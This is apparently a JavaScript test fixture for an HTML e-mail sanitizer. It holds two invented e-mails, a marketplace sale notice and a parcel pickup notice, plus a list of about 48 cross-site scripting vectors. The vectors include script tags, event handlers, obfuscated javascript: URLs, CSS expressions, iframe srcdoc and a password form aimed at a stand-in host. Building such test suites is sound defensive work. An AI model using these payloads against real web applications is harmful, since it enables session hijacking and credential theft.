// ════════════════════════════════════════════════════════════════════════════
//  DES E-MAILS HTML INVENTÉS (6 nov., v36 « e-mails HTML ») — dépôt PUBLIC :
//  aucune vraie vente, aucun vrai pseudo, aucune vraie adresse (domaines `.test`).
//  · VENTE_HTML : la FORME d'un e-mail « Ton article est vendu » d'une plateforme
//    (tableau de 600 px fixes, logo et photo distants, bouton, pixel de suivi,
//    feuille de style avec requête média, mentions en pied) ;
//  · RETRAIT_HTML : un « colis disponible » de transporteur, qui SAIT se mettre en
//    sombre (`prefers-color-scheme: dark`), code de retrait en grand ;
//  · VECTEURS : les attaques connues, une par entrée — chacune appelle
//    `parent.__xss('<nom>')` (ou `top`, `window`) si elle s'exécute un jour.
// ════════════════════════════════════════════════════════════════════════════
'use strict';

const VENTE_HTML = `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width">
<title>Ton article est vendu</title>
<link rel="stylesheet" href="https://cdn.exemple.test/mail.css">
<style type="text/css">
  body { margin:0; padding:0; background:#f5f5f5; }
  .bouton a { display:inline-block; padding:12px 22px; border-radius:6px; background:#09757a; color:#ffffff !important; text-decoration:none; font-weight:bold; }
  .titre { font-size:22px; font-weight:bold; color:#111111; }
  .doux { color:#767676; font-size:13px; }
  @media only screen and (max-width: 480px) { .colonne { display:block !important; width:100% !important; } }
  @font-face { font-family: Marque; src: url(https://cdn.exemple.test/marque.woff2); }
</style>
</head>
<body style="margin:0;padding:0;background:#f5f5f5" bgcolor="#f5f5f5">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f5f5f5"><tr><td align="center">
<table width="600" cellpadding="0" cellspacing="0" border="0" style="width:600px;background:#ffffff">
  <tr><td style="padding:24px 32px" align="left"><img src="https://images.exemple.test/logo-plateforme.png" width="120" height="32" alt="Plateforme" style="display:block;border:0"></td></tr>
  <tr><td style="padding:0 32px 8px" class="titre">Ton article est vendu&nbsp;!</td></tr>
  <tr><td style="padding:0 32px 20px;font:15px/1.5 Arial,sans-serif;color:#333333">
    Bonjour <b>boutique-une</b>,<br><br>
    <b>acheteur-invente</b> a acheté ton article. Prépare le colis et envoie-le avant le <b>12/11/2026</b>.
  </td></tr>
  <tr><td style="padding:0 32px 20px">
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="border:1px solid #e6e6e6;border-radius:8px"><tr>
      <td width="120" class="colonne" style="padding:12px"><img src="https://images.exemple.test/photos/paire-inventee.jpg" width="96" height="96" alt="Photo de l'article" style="display:block;border-radius:6px;object-fit:cover"></td>
      <td class="colonne" style="padding:12px;font:15px/1.4 Arial,sans-serif;color:#111111">
        <div style="font-weight:bold">Baskets Exemple Runner 42</div>
        <div class="doux">Taille 42 · Très bon état</div>
        <div style="font-size:18px;font-weight:bold;margin-top:6px">55,00&nbsp;€</div>
      </td></tr></table>
  </td></tr>
  <tr><td style="padding:0 32px 28px" class="bouton"><a href="https://plateforme.exemple.test/transactions/12345678901?utm_source=mail">Voir la commande</a></td></tr>
  <tr><td style="padding:16px 32px;background-image:url(https://images.exemple.test/fond.png);background-color:#fafafa" class="doux">
    N° de transaction : 12345678901<br>
    Tu reçois cet e-mail car tu as un compte sur la plateforme. <a href="https://plateforme.exemple.test/preferences">Gérer mes e-mails</a>.<br>
    Plateforme Exemple SAS · 1 rue Inventée · 00000 Ville-Test
  </td></tr>
</table>
</td></tr></table>
<img src="https://suivi.exemple.test/wf/open?u=abc123" width="1" height="1" alt="" style="display:block">
<img src="https://suivi.exemple.test/pixel.gif?id=9" style="width:1px;height:1px;border:0">
</body></html>`;

const RETRAIT_HTML = `<html><head><style>
  :root { color-scheme: light dark; }
  .carte { background:#ffffff; color:#1a1a1a; border-radius:12px; padding:20px; }
  .code { font-size:34px; letter-spacing:4px; font-weight:800; }
  @media (prefers-color-scheme: dark) { .carte { background:#1c1c1e; color:#f2f2f2; } body { background:#000000 !important; } }
</style></head>
<body style="background:#eeeeee">
<div class="carte">
  <p><img src="https://images.exemple.test/transporteur.png" width="140" height="28" alt="Transporteur Exemple"></p>
  <h1 style="font-size:20px">Votre colis est disponible</h1>
  <p>Votre colis <b>00001111</b> vous attend au point relais <b>Relais de l'Exemple</b>, 2 place Inventée, 00000 Ville-Test.</p>
  <p>Code de retrait :</p>
  <p class="code">418205</p>
  <p>À retirer avant le <b>20/11/2026</b>.</p>
  <p><a href="https://transporteur.exemple.test/suivi/00001111">Suivre mon colis</a></p>
</div>
<img src="https://suivi.exemple.test/open/xyz" width="1" height="1">
</body></html>`;

// Chaque vecteur appelle __xss(nom) s'il s'exécute. `marque` : un mot qui ne doit
// plus apparaître dans un endroit exécutable du résultat.
const X = (n) => `parent.__xss&&parent.__xss('${n}')`;
const VECTEURS = [
  ['script', `<p>a</p><script>${X('script')}</script><p>b</p>`],
  ['script majuscules', `<SCRIPT>${X('script-maj')}</SCRIPT>`],
  ['script coupé', `<scr<script>ipt>${X('script-coupe')}</scr</script>ipt>`],
  ['img onerror', `<img src=x onerror="${X('onerror')}">`],
  ['img/src/onerror', `<img/src=x/onerror=${X('img-slash')}>`],
  ['svg onload', `<svg onload="${X('svg')}"><circle r="4"/></svg>`],
  ['svg/onload', `<svg/onload=${X('svg-slash')}>`],
  ['svg script', `<svg><script>${X('svg-script')}</script></svg>`],
  ['math', `<math><mtext><table><mglyph><style><img src=x onerror="${X('math')}">`],
  ['body onload', `<body onload="${X('body')}"><p>x</p></body>`],
  ['a javascript', `<a href="javascript:${X('href')}">clic</a>`],
  ['a javascript entités', `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;${X('href-ent')}">clic</a>`],
  ['a javascript tabulation', `<a href="java&#x09;script:${X('href-tab')}">clic</a>`],
  ['a javascript sans ;', `<a href="&#106avascript:${X('href-sans')}">clic</a>`],
  ['a javascript espace', `<a href=" JaVaScRiPt:${X('href-esp')}">clic</a>`],
  ['a javascript Tab nommée', `<a href="java&Tab;script&colon;${X('href-nom')}">clic</a>`],
  ['a data html', `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">clic</a>`],
  ['a vbscript', `<a href="vbscript:msgbox(1)">clic</a>`],
  ['style expression', `<div style="width:expression(${X('expr')})">x</div>`],
  ['style expression échappée', `<div style="width:exp\\72 ession(${X('expr-ech')})">x</div>`],
  ['style expression commentée', `<div style="width:expr/**/ession(${X('expr-com')})">x</div>`],
  ['style url javascript', `<div style="background:url('javascript:${X('url')}')">x</div>`],
  ['style behavior', `<div style="behavior:url(x.htc);-moz-binding:url(x.xml#a)">x</div>`],
  ['bloc style import', `<style>@import 'https://piege.exemple.test/x.css'; p{color:red}</style><p>x</p>`],
  ['bloc style sortie', `<style>p{color:red}</style><img src=x onerror="${X('style-sortie')}"></style>`],
  ['iframe', `<iframe src="https://piege.exemple.test/"></iframe><iframe srcdoc="<script>${X('iframe-srcdoc')}</script>"></iframe>`],
  ['frame', `<frameset><frame src="javascript:${X('frame')}"></frameset>`],
  ['object', `<object data="javascript:${X('object')}"></object><embed src="javascript:${X('embed')}">`],
  ['meta refresh', `<meta http-equiv="refresh" content="0;url=javascript:${X('refresh')}"><meta http-equiv="refresh" content="0;url=https://piege.exemple.test/">`],
  ['base href', `<base href="https://piege.exemple.test/"><a href="/chemin">lien relatif</a>`],
  ['form action', `<form action="https://piege.exemple.test/vol"><input name="mdp" type="password"><button formaction="javascript:${X('formaction')}">Envoyer</button></form>`],
  ['link stylesheet', `<link rel="stylesheet" href="https://piege.exemple.test/x.css"><link rel="import" href="https://piege.exemple.test/x.html">`],
  ['commentaire', `<!-- <script>${X('commentaire')}</script> --><p>visible</p><!--><img src=x onerror="${X('commentaire2')}">-->`],
  ['cdata', `<![CDATA[<script>${X('cdata')}</script>]]>`],
  ['noscript', `<noscript><p title="</noscript><img src=x onerror=${X('noscript')}>"></noscript>`],
  ['textarea', `<textarea><img title="</textarea><img src=x onerror=${X('textarea')}>"></textarea>`],
  ['title', `<title><img src=x onerror="${X('title')}"></title>`],
  ['template', `<template><img src=x onerror="${X('template')}"></template>`],
  ['attribut sans fin', `<img src="https://images.exemple.test/a.png" alt="x onerror=${X('sans-fin')}`],
  ['attribut entités', `<img src="x" &#111;nerror="${X('ent-nom')}">`],
  ['srcset', `<img srcset="https://piege.exemple.test/a.png 1x" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">`],
  ['svg data', `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`],
  ['xlink', `<a xlink:href="javascript:${X('xlink')}">x</a>`],
  ['onclick', `<p onclick="${X('onclick')}" onmouseover="${X('onmouseover')}">survole</p>`],
  ['target top', `<a href="https://exemple.test/" target="_top">haut</a>`],
  ['plaintext', `<p>avant</p><plaintext><script>${X('plaintext')}</script>`],
  ['entités texte', `&lt;script&gt;${X('texte')}&lt;/script&gt;`],
  ['nul', `<scr\u0000ipt>${X('nul')}</scr\u0000ipt>`],
];

module.exports = { VENTE_HTML, RETRAIT_HTML, VECTEURS };
